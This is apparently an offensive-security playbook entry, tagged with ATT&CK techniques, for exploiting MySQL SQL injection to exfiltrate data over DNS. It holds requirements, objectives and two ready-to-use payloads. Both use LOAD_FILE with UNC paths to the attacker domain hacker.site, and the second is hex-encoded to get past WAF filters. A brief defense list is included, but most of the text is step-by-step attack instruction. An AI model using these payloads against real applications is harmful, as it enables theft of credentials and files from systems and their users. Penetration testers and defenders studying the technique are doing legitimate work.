---
type: procedure
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
  - >-
    [[techniques/Exfiltration Over Command and Control Channel|T1041 -
    Exfiltration Over Command and Control Channel]]
sub_techniques:
  - >-
    [[techniques/Exfiltration Over Alternative Protocol/DNS|T1048.003 -
    Exfiltration Over Alternative Protocol: DNS]]
tags:
  - dns-exfiltration
  - mysql-injection
  - mysql-out-of-band
  - sql-injection
commands:
  - '[[commands/mysql-load-file-remote-server-concat]]'
  - '[[commands/mysql-load-file-hexadecimal-values]]'
tools: []
platforms:
  - Web
  - MySQL
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# MySQL-SQL-Injection-for-Out-of-Band-DNS-Exfiltration

## Summary

This procedure exploits a SQL injection vulnerability in a MySQL database to trigger out-of-band data exfiltration via DNS queries. By injecting payloads that use the LOAD_FILE function with UNC paths, the MySQL server resolves attacker-controlled DNS names, encoding and leaking sensitive data such as file contents or database version information through DNS resolution attempts.

## Description

In a typical web application backed by MySQL, an attacker identifies an injectable parameter (e.g., in a search field or URL). The injection allows execution of arbitrary SQL, including LOAD_FILE to read files. To exfiltrate data without direct return (e.g., due to WAF or size limits), an out-of-band technique encodes data into DNS subdomains. The payload constructs a UNC path like \\data.hacker.site\file, causing MySQL to query hacker.site for 'data', which the attacker's DNS server logs. This bypasses HTTP filters and enables stealthy exfiltration of credentials, configs, or other files. It targets environments with vulnerable web apps and permissive MySQL file privileges, often in LAMP stacks.

## Requirements

1. Valid SQL injection point in a MySQL-backed web application (e.g., unparameterized query).
2. MySQL server with FILE privilege enabled for the exploited user (common default).
3. Attacker-controlled DNS server to capture exfiltrated queries (e.g., using tools like dnsmasq or a public DNS resolver).
4. Network access allowing the MySQL server to perform outbound DNS resolutions.
5. Basic knowledge of SQL syntax and web proxy tools like Burp Suite for payload delivery.

## Defense

- Use prepared statements and parameterized queries to prevent SQL injection.
- Disable or restrict FILE privileges on MySQL users (e.g., REVOKE FILE ON *.* FROM 'user'@'%').
- Monitor DNS traffic from database servers for anomalous queries (e.g., high-volume or external domains).
- Implement DNS sinkholing and egress filtering to block unauthorized resolutions.
- Deploy WAF rules to detect UNC path patterns or LOAD_FILE usage in queries.

## Objectives

1. Inject SQL payload to read sensitive files or database metadata via LOAD_FILE.
2. Trigger DNS resolutions that exfiltrate data out-of-band to attacker-controlled server.
3. Confirm exfiltration by capturing DNS queries without alerting via direct response.

## Instructions

### Step 1: Inject Basic UNC Path Payload

**Context**: Deliver the initial SQL injection payload using a concatenated UNC path to test DNS exfiltration. This reads a file (or uses version() for testing) and appends it to a subdomain, forcing a DNS query to your controlled domain. Use a web proxy to inject into the vulnerable parameter.

**Command** ([[commands/mysql-load-file-remote-server-concat]]):
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```

> This command exploits the injection to construct a UNC path like \\5.7.44.hacker.site\a.txt (assuming MySQL version 5.7.44). The MySQL server attempts to load the 'remote' file, resolving hacker.site and sending the version as a subdomain query. Expected output in the application may be empty or error due to out-of-band nature; success is verified on your DNS server logs showing the query for version.hacker.site.

### Step 2: Inject Hexadecimal Encoded UNC Path

**Context**: If the basic payload is filtered (e.g., by WAF blocking backslashes), use hexadecimal encoding to obfuscate the UNC path. This evades basic string filters while achieving the same DNS exfiltration. Substitute your domain and file as needed.

**Command** ([[commands/mysql-load-file-hexadecimal-values]]):
```sql
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
```

> This hex-encodes the path (0x5c5c5c5c = \\), version(), .hacker.site\\a.txt), resulting in the same DNS query. Application response may show no data, but check DNS logs for the subdomain query. If successful, proceed to exfiltrate actual file contents by replacing version() with hex-encoded LOAD_FILE results or substring extractions.
